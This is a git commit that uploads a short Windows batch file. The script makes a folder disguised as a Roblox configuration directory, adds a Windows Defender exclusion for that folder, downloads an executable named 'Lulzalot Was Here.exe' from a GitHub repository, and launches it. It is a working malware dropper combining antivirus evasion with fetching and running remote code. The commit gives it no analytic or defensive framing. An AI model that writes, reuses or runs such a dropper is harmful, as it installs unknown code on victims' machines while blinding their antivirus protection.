da9d1275d25e09e5781a2cefe5578a4ff353ff89
sirfedsalot <criticalshark@proton.me>
2025-02-17 00:44:13 -0600

    Add files via upload

---
+++ nasser-furz.bat
@@ -0,0 +1,5 @@
+set "folderPath=%USERPROFILE%\AppData\Local\RobloxConfig"
+mkdir "%folderPath%"
+powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/Lulzalot%20Was%20Here.exe' -OutFile '%folderPath%\Lulzalot Was Here.exe'"
+start "" "%folderPath%\Lulzalot Was Here.exe"
